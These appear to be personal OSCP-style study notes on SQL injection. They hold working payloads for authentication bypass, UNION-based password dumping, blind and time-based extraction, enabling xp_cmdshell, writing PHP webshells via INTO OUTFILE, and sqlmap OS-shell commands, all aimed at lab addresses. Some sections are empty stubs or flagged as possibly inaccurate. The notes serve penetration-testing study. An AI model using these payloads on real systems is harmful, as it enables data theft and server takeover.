
Caused by [unsanitized](Unsanitized%20%Data.md) user input being inserted into queries and subsequently passed to a database for execution.  
  
[sqlmap](Tools.md#sqlmap) - SQL Injection scanner & exploitation tool  
  
Doesn't always have to be w/in form fields - Can also occur within URLs  
```sql
http://192.168.xxx.10/debug.php?id='
```

## Example vulnerable code
```php
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```
- Searches the users table for the provided username and its respective password
- Saves them into the *uname* and *passwd* variables.
- The query string is then stored in _sql_query_ and used to perform the query against the local database through the _mysqli_query_ function
- Which saves the result of query in _$result_.

Because both the _user_name_ and _password_ variables are retrieved from the user _POST_ request and inserted directly in the _sql_query_ string without any prior check, an attacker could modify the final SQL statement before it is executed by the SQL database.



# Malformed input values
```sql
' " ` % %% -- /* // ) ;
```

# Syntax
Different syntax is required based on the database engine or scripting language used
- MySQL (port 3306)
	- Default hash *Caching SHA-256* (prepended w/ $A$005)
	- MariaDB - Open-source fork
- Microsoft SQL Server (MSSQL)
- PostgreSQL
- Oracle

MySQL/ MSSQL's DB metadata - `information_schema`

### MySQL

#### Login
```bash
mysql -u root -p'root' -h 192.168.199.16 -P 3306
```

#### Working with the db
```sql
-- Show mysql version
SELECT version();
@@version

-- Verify current db user
SELECT system_user();

-- Show all running dbs
show databases;
show schemas;

-- Work within a specific dd
use <db_name>;

-- Show db's tables
show tables from <db_name>;
show tables; -- from w/in a db

-- Enumerate through all tables listed in information_schema
-- SELECT table_name FROM information_schema.tables;

-- Search for a table within all databases
SELECT table_schema as database_name, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema not in ('information_schema','mysql','performance_schema','sys') ORDER BY database_name, table_name;

-- Retrieve pw of *offsec* user present in the *mysql* db
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```


### MSSQL
#### Login (via Linux)
```bash
impacket-mssqlclient Administrator:Lab123@192.168.199.18 -windows-auth
```

#### Working with the db
```sql
-- Show mssql version
SELECT @@version;

-- Verify current db user
SELECT current_user;

-- Show all running dbs
SELECT name FROM sys.databases;

-- Show db's tables
SELECT name FROM sysobjects WHERE xtype = 'U';
SELECT * FROM <db>.information_schema.tables;

-- Show contents of a table
SELECT * FROM <table name>
SELECT * FROM <db>.dbo.<table_name>; /*********NOTE
```
\*\*\*\*\*\*\*\*\*\*\*\***Note:**  When you query to show all tables inside the master database using SELECT * FROM master.information_schema.tables; , you might not see certain system views or tables such as *sysusers* or *database_principals* because these are not actual tables but system views.
To list system views and tables, you would use different system catalog views `SELECT * FROM master.sys.views;` or you can go for system tables `SELECT * FROM master.sys.tables;`

### Old Notes

```sql
UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables
```

```sql
column_name FROM information_schema.columns WHERE table_name='users'
```
	Retrieves column names from the _users_ table  

```sql
UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME='users'
```
 
#### Oracle
```sql
(SELECT banner FROM $version)
```
	DB metadata  

-- Shows db version  
-- Shows user and hostname of the account interacting w/ the db  
-- Shows name of the db in use  
-- Shows account name used for Windows authentication used by the db  
-- Enumerates through all tables listed in schema  
-- Retrieves column names from the _users_ table  

#### sqlite  
```sql
sqlite_schema  
sqlite_master
```
	DB metadata  

```sql
sqlite_version()
```
	Shows db version  


-- Shows user and hostname of the account interacting w/ the db  
-- Shows name of the db in use  
-- Shows account name used for Windows authentication used by the db  

```sql
(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
```
	Enumerates through all tables listed in schema  

```sql
(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users')
```
	Retrieves column names from the _user_s table  

```sql
UNION SELECT 1,group_concat(password) FROM users-- -
```
	Dump passwords from _users_ table  
  

##### worked for OSCP exercise:
```sql
http://192.168.215.52/debug.php?id=1 union select username, flag, time, password, 5 from users
```

```sql
sqlite_schema.type
```
	‘table’, ‘index’, ‘view’, or ‘trigger’  

```sql
sqlite_schema.name
```
	Holds name of the object  

```sql
sqlite_schema.sql
```
	Stores SQL text that describes the object (CREATE statement)  
  
```sql
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
```
	Blind-Based Auth Bypass using Boolean-Based SQLi  
		CAST() - Convert value to a type.  
		X'54' - Hex representation of ‘T’. x'54' for ‘t’  

```sql
admin' AND length((SELECT password from users where username='admin'))==#-- -
```
	Check length of password  

#### H2  
```sql
schema()
```
	DB metadata  

```sql
h2version()
```
	Shows db version  

-- Shows user and hostname of the account interacting w/ the db  
-- Shows name of the db in use  
-- Shows account name used for Windows authentication used by the db  
-- Enumerates through all tables listed in schema  
-- Retrieves column names from the _users_ table  
  
#### PostgreSQL
-- DB metadata  
-- Shows db version  
-- Shows user and hostname of the account interacting w/ the db  
-- Shows name of the db in use  
-- Shows account name used for Windows authentication used by the db  
-- Enumerates through all tables listed in schema  
-- Retrieves column names from the _users_ table




# ID'ing

By forcing the closing quote on a parameter value and adding a tautology (condition that's always true) statement followed by a _--_ comment separator and two forward slashes (_//_), we can prematurely terminate the SQL statement.
- Requires two consecutive dashes followed by at least one whitespace character.
```sql
offsec' OR 1=1 -- //
```

\***Note:** Some languages have functions that query the db and expect a single record, so if these functions get more than one row, they'll throw an error.  
- If we do get these errors, we can instruct the query to return a fixed number of records w/ the LIMIT statement.  
```sql
-- Doesn't work
' OR 1=1;#

'-- Does work
' OR 1=1 LIMIT 1;#

' --Possibly works
' OR 1=1;-- -
```
- [https://blog.raw.pm/en/sql-injection-mysql-comment/](https://blog.raw.pm/en/sql-injection-mysql-comment/)  
  
If two or more fields are requested, may need to have both w/in URL/ input fields  
Ex:  
```sql
login?profileID=-1' or 1=1--&password=a
```


##### Start of a single line comment
```sql
--
```
- If errors out, may need to add ‘ //’ or ‘ /*’  
- In MySQL, the **--** comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on).  
- The safest solution for inline SQL comment is to use **--**\<space\>\<any character\> such as **-- -** because if it is URL-encoded into **--%20-** it will still be decoded as **-- -** 

##### Other characters
```sql
-- Comment marker (MySQL/ MariaDB)
#

--Comment marker (less common)
%00

-- Statement terminator and a way to separate each SQL statement
;

-- Wildcard
%

-- String delimiter - Useful for finding vulns
'
```


# Types
- **In-Band** - Results are returned onscreen  
- **Error-Based** - Obtaining info about the db structure through error messages  
- **Blind-Based** - Little to no feedback given whether query works or not as error messages are disabled (can still use for auth bypass on login pgs)  
- **Union-Based** - Uses UNION operator alongside SELECT to return additional results  
- **Boolean-Based** - Where response only returns one of two options: true/ false  
• **Out-of-Band** - Relies on specific features enabled in the db or webapp logic which makes an external network call based on the SQL query results.  
	- Two different communication channels: one to launch attack, one to gather results  
	- Less common.  
		1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.  
		2. The Website makes an SQL query to the database which also passes the hacker's payload.  
		3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.  
  
Ex: DNS can be used to exfil data from a db


# Exploiting

OSCP's using () as req for successful sqli & potentially requiring a wildcard before the '
```sql
%' OR 1=1 in (SELECT * FROM users) -- //
```


```sql
-- Attempt to recover MySQL version
' or 1=1 in (select @@version) -- //

'-- Attempt to retrieve Users table
' OR 1=1 in (SELECT * FROM users) -- //

'-- If above errors out stating Operand should contain 1 column attempt to list a specific column
' or 1=1 in (SELECT password FROM users) -- //

' -- Attempt to get Admin's password hash
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

## SQL Statements

```sql
-- Extract data from a db/ Select specific db or table
SELECT <data>

-- Insert new data into a db
INSERT INTO users (username,password) VALUES ('bob','password123');

-- Update data in a db
UPDATE users SET username='root',password='pass123' WHERE username='admin';

-- Delete data from a db
DELETE

-- Specify desired table
SELECT <column_name> FROM <table_name>

-- Filter records
WHERE id=1
WHERE username = 'admin'

-- Combine the result-set of two or more SELECT statements
	-- Each SELECT statement **MUST** return the same number of columns
UNION

-- Display the rows that are common to all SELECT statements
INTERSECT

-- Return the first # of rows matching the query (1st number - how many rows to skip; 2nd - how many rows to return)
LIMIT 2
	-- Returns 1 row, skips the first 2

-- Sort the results based on the values in the number column
	-- Can  be used to find max # of columns by incrementing until an error is thrown (Easily automated w/ Burp's Repeater)
ORDER BY

-- Extract a substring from a string
SUBSTR(1,2,3)
	-- 1. Operated text (ex: db name)
	-- 2. Char to start with
	-- 3. Number of chars to extract
1' AND (ascii(substr((select database()),2,1))) < 115 --+
	'-- Compares ascii value of the 2nd character of the db's name to 115 ('s')
```

## Column Number Enum
```sql
-- In URL
http://192.168.xxx.10/debug.php?id=1 order by 1

-- In form field
' ORDER BY 1-- //
```
- Orders the results by a specific column.  If there is at least one column in the query, it's valid and the page will render w/o errors.  Otherwise, it'll fail if the selected column doesn't exist.
  
  
To determine which columns are displayed on a page and where:    
```sql
-- Assuming 3 columns total in the db
http://192.168.xxx.10/debug.php?id=1 UNION ALL SELECT 1, 2, 3
```

  
\***IF** the results of the page don't display the numbers after SELECT ^, you may need to adjust above to:
```sql
id=0 UNION
```
to prevent the first returned result somewhere in the web site's code from being displayed.  
  
Whichever columns are displayed, we can target that column and use it to extract data from the db:  
\***Note** - Following cmds are platform specific  
Ex: Using column 3 for data extraction:  
```sql
UNION ALL SELECT 1, 2, @@version
```
	Shows version of MySQL software  

```sql
' UNION SELECT null, database(), user(), @@version, null -- //
```
- Column 1 is typically reserved for the ID field consisting of an _integer_ data type, meaning it cannot return the string value we are requesting
	- Best to use 'null' in it's place


```sql
-- Retrieve the _columns_ table from the _information_schema_ database belonging to the current database
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

```sql
-- Dump users table
' UNION SELECT null, username, password, description, null FROM users -- //
```
  
#### More UNION Statements  
```sql
UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables
```

```sql
UNION ALL SELECT 1, username, password FROM users
```
	Retrieves cell data for _username_ and _password_ fields in the _users_ table
```sql
UNION ALL SELECT * FROM users
```
	works too  
  
- Note: Don't forget commas to delineate!  
  
##### After finding out the db in use w/ _database()_, find out table names
```sql
0 UNION SELECT 1, 2, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db'
```

##### Can then discover names of columns of the above found table
```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table'
```

##### Can then find details from table using either
```sql
0 UNION SELECT * FROM table_name where username='user'
```
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM tablen
```
	Provides list in single line & uses HTML tag _<br>_ for line breaks btw entries  


# Blind-Based Auth Bypass
Login forms that are connected to a db of users are often developed so the web app isn't interested in the content of the fields but whether the two make a matching pair in the users table.
  
→ Leads to:  
### Boolean-Based
When you have a login that checks for usernames already taken: can enum looking for results that return ‘true’

##### Easy test
```sql
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

##### Enumerate for other users
```sql
-- IF condition will always be true inside the statement itself, but will return false if the user is non-existent.
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

false_user' UNION SELECT 1,2,3 where database() like '%';-- 
```
	Can cycle through _‘a%’_, _‘b%’_, _‘c%’_, etc etc until you reach a ‘true’ result telling you the start of the name of the db.
		Can then cycle through all combinations of _‘sa%’_, _'sb%'_, _‘sc%’_, etc etc until all letters of the db name are discovered.


### More
##### Enum through table names within discovered db
```sql
false_user' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'found_table' and table_name like 'a%';--
```

##### Confirm found table within found db
```sql
false_user' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'found_db' and table_name='found_table';--
```

##### Enum through columns
```sql
false_user' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='found_db' and TABLE_NAME='found_table' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';  

```
  
##### Enum through data
```sql
false_user' UNION SELECT 1,2,3 FROM found_table WHERE username_col='a%'
```
	Find usernames  

```sql
false_user' UNION SELECT 1,2,3 FROM found_table WHERE username_col='admin' and password_col like 'a%'
MSSQLMSSQL```
	Find passwords  
  
  
  
### Time-Based Blind SQLi:
Similar to Boolean-Based, but the time it takes for the query to complete indicates whether the the query is correct or not.  
  
Time delay method SLEEP(x) is added alongside UNION statement, whereby SLEEP(x) will only get executed upon a successful UNION SELECT statement.  
```sql
false_user' UNION SELECT SLEEP(5);--
```
  
##### Can then craft enumeration queries as shown above ^^  
  
  
# Code Execution

Depends on OS, service privileges, & filesystem permissions.

## MSSQL - *xp_cmdshell*
- Takes a string and passes it to a cmd shell for execution.  Function returns any output as rows of text
	- Disabled by default and must be called w/ the **EXECUTE** keyword instead of SELECT

##### Enabling *xp_cmdshell*
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
	Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
	...
	SQL> EXECUTE sp_configure 'show advanced options', 1;
		[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
	SQL> RECONFIGURE;
	SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
		[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
	SQL> RECONFIGURE;
	EXECUTE xp_cmdshell 'whoami';
		output
		...
		nt service\mssql$sqlexpress
		
		NULL
```


## SELECT INTO_OUTFILE
- Various MySQL db variants don't offere a single function to escalate to RCE, we can abuse the *SELECT INTO_OUTFILE* statement to write files on the web server

##### Write a webshell on disk
- Requires the file location to be writable to the OS user running the DB software
```sql
-- Assumes 5 columns
-- Prepend '
UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
```
- May return an "Uncaught TypeError" which relates to the return type and not necessarily to the writing of the file to disk

To confirm success
```bash
# In URL
192.168.50.19/tmp/webshell.php?cmd=id
```
- Assuming **id** output is returned through the web browser, we know the webshell is working as expected.


### More 
Can use [load_file](https://www.exploit-db.com/papers/14635) and _Into OUTFILE_ functions to read from/ write to a file on the underlying OS.  
  
Read from hosts file:  
```sql
http://192.168.xxx.10/debug.php?id=1 UNION ALL SELECT 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
 
Writing a PHP backdoor to the web server:  
```sql
http://192.168.xxx.10/debug.php?id=1 UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```


If the above works, we can access the backdoor:  
```null
http://192.168.xxx.10/backdoor.php?cmd=ipconfig
```  
  
# Automation ([sqlmap](Tools.md#sqlmap))

##### See if vuln exists (Can specify parameter w/ **-p**)
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1"
```

##### Enumerate available databases
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --dbs
```

##### Enumerate given database's tables
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb --tables
```

##### Enumerate given db's table's columns
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb -T users --columns
```
  
##### Dump info
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" -D webappdb -T users --dump
```
  
##### Can try for a SQL shell
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --sql-shell
```

##### Or an OS shell
```bash
sqlmap -u "http://192.168.xxx.10/debug.php?id=1" --os-shell
```
	- Need to choose back-end DBMS (ASP, ASPX, PHP, JSP)  
	- Will ask “Retrieve command from standard output”. (yes, no, always)  

##### OS Shell & Time-Based attacks
For time-based attacks, it's not ideal to interact with a shell due to their high latency.

1. Intercept the POST request via Burp & save as a local text file on our vm
2. Invoke **sqlmap** using the **-r** parameter to use the previously saved file & save os-shell to the web-root /tmp directory
```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
- Once **sqlmap** confirms the vuln, it prompts for the language the webapp is written in, then uploads the webshell to the specified web folter & returns an interactive shell

### Inaccurate??



```sql
user()
```
	Shows user and hostname of the account interacting w/ the db  

```sql
database()
```
	Shows name of the db in use  


```sql
table_name FROM information_schema.tables
```
	Enumerates through all tables listed in schema  